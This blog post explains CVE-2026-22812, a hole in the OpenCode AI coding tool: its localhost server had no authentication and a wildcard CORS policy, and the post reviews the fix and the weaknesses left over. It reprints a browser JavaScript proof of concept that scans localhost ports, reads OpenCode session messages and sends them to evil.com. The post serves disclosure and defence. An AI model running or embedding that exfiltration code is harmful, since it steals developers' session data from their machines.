# OpenCode Got an RCE and I Already Wrote the Exploit

On January 12, 2026, a security advisory dropped for OpenCode: [CVE-2026-22812](https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh). CVSS 8.8. Any website you visited could execute shell commands on your machine.

I'd already written the proof of concept. It was in [Localhost Is Not a Firewall](./localhost-is-not-a-firewall.md), published months earlier, using OpenCode as the example.

---

## What Happened

OpenCode automatically started an HTTP server every time you launched it. That server had no authentication and returned `Access-Control-Allow-Origin: *` on every response.

The exposed endpoints:

| Endpoint                  | What It Does                         |
| ------------------------- | ------------------------------------ |
| `POST /session/:id/shell` | Execute arbitrary shell commands     |
| `POST /pty`               | Create interactive terminal sessions |
| `GET /file/content?path=` | Read any file on disk                |

No token. No password. No origin check. Just a wide-open HTTP server running on port 4096 with full access to your machine.

The attack was trivial. Any website you visited could do this:

```javascript
for (let port = 4096; port < 4200; port++) {
	fetch(`http://localhost:${port}/session/list`)
		.then((r) => r.json())
		.then((sessions) => {
			sessions.forEach((s) => {
				fetch(`http://localhost:${port}/session/${s.id}/messages`)
					.then((r) => r.json())
					.then((messages) => {
						fetch('https://evil.com/collect', {
							method: 'POST',
							body: JSON.stringify({ port, session: s.id, messages }),
						});
					});
			});
		})
		.catch(() => {});
}
```

That's from my article. Same code. Same ports. Same attack path.

---

## The Timeline

| Date              | Event                                                                                                                              |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| Months before CVE | I write [Localhost Is Not a Firewall](./localhost-is-not-a-firewall.md), listing OpenCode as "CORS: \*, no auth, Mitigation: None" |
| November 17, 2025 | Researcher reports the bug to support@sst.dev                                                                                      |
| (no response)     | SST doesn't reply                                                                                                                  |
| January 12, 2026  | Public disclosure via GHSA-vxw4-wv6m-9hhh                                                                                          |
| v1.0.216          | `OPENCODE_SERVER_PASSWORD` added (HTTP Basic Auth)                                                                                 |
| v1.1.10           | Server made opt-in; no longer starts automatically                                                                                 |

The researcher waited almost two months. No response. So they went public.

---

## The Fix

Two phases.

**Phase 1 (v1.0.216)**: Added a `OPENCODE_SERVER_PASSWORD` environment variable. When set, the server requires HTTP Basic Auth on every request:

```typescript
const password = Flag.OPENCODE_SERVER_PASSWORD;
if (!password) return next(); // still optional
const username = Flag.OPENCODE_SERVER_USERNAME ?? 'opencode';
return basicAuth({ username, password })(c, next);
```

Standard Hono middleware. Default username is `opencode`, password is whatever you put in the env var.

**Phase 2 (v1.1.10)**: Made the server opt-in. You now have to explicitly run `opencode serve` or `opencode web` to start it. The TUI no longer spawns an HTTP server by default.

They also tightened CORS:

```typescript
cors({
	origin(input) {
		if (input.startsWith('http://localhost:')) return input;
		if (input.startsWith('http://127.0.0.1:')) return input;
		if (input === 'tauri://localhost') return input;
		if (/^https:\/\/([a-z0-9-]+\.)*opencode\.ai$/.test(input)) return input;
		return;
	},
});
```

No more `*`. Only localhost, Tauri, and `*.opencode.ai`.

---

## The Three Articles That Called It

I wrote a series of articles about localhost security before this CVE existed. Here's how each one maps to what actually happened.

**[Localhost Is Not a Firewall](./localhost-is-not-a-firewall.md)** described the exact attack. Port scanning from a malicious website, finding OpenCode on 4096, exfiltrating session data. The article even had the vulnerability table:

| Tool             | Default Behavior              | Mitigation   |
| ---------------- | ----------------------------- | ------------ |
| OpenCode         | CORS: \*, no auth             | None         |
| Jupyter Notebook | Was open → now requires token | Token in URL |

"None" under mitigation. That was accurate.

**[Origin Allowlists Don't Stop XSS](./origin-allowlists-dont-stop-xss.md)** explained why the CORS fix alone isn't enough. OpenCode now allowlists `*.opencode.ai`. If any subdomain of opencode.ai gets XSS'd, the attacker bypasses the origin check entirely. The article's conclusion: the real solution is a secret that JavaScript can't access, which is exactly what `OPENCODE_SERVER_PASSWORD` provides. A server-side env var that browser JS never sees.

**[How OpenCode Web Works](./how-opencode-web-works.md)** documented the architecture that created the attack surface: Bun HTTP server on port 4096, WebSocket PTY connections, the REST API that controls everything. Understanding the surface is the first step to understanding the risk.

---

## What's Still Concerning

OpenCode's [SECURITY.md](https://github.com/anomalyco/opencode/blob/dev/SECURITY.md) now says:

> Server mode is opt-in only. When enabled, set `OPENCODE_SERVER_PASSWORD` to require HTTP Basic Auth. Without this, the server runs unauthenticated (with a warning). It is the end user's responsibility to secure the server.

The password is optional. If you don't set it, you get a yellow warning and an open server. The security model went from "no option to secure it" to "option to secure it, but off by default."

The `*.opencode.ai` wildcard in CORS is also worth watching. That regex matches any subdomain. A single XSS on any `*.opencode.ai` page. Marketing site, docs, status page. Would let an attacker reach every OpenCode server that allows that origin. I wrote about [why this pattern fails](./origin-allowlists-dont-stop-xss.md).

And the password travels as Base64 in an `Authorization` header over plain HTTP. No TLS by default. On a shared network, that's readable with Wireshark.

---

## Credit Where It's Due

The fix is solid for what it is. Making the server opt-in was the right call; most users never needed it exposed. HTTP Basic Auth is boring and well-understood. The CORS tightening from `*` to an explicit allowlist closed the most obvious browser-based attack.

OpenCode ships fast: [618 releases and counting](./how-opencode-ships-fast.md). The patch went out quickly once the disclosure forced their hand.

---

## The Pattern

This will keep happening. Every dev tool that binds to localhost without auth is one CVE away from the same headline. The [Localhost Is Not a Firewall](./localhost-is-not-a-firewall.md) table had entries for Vite, webpack, Docker, Redis, Elasticsearch. OpenCode was just the first AI coding tool to learn the lesson publicly.

Jupyter figured this out years ago and added mandatory tokens. The rest of the industry looked at that and said "too much friction." Now OpenCode has a CVE and a rushed patch.

Localhost is not a firewall. I wrote it before. It's still true.
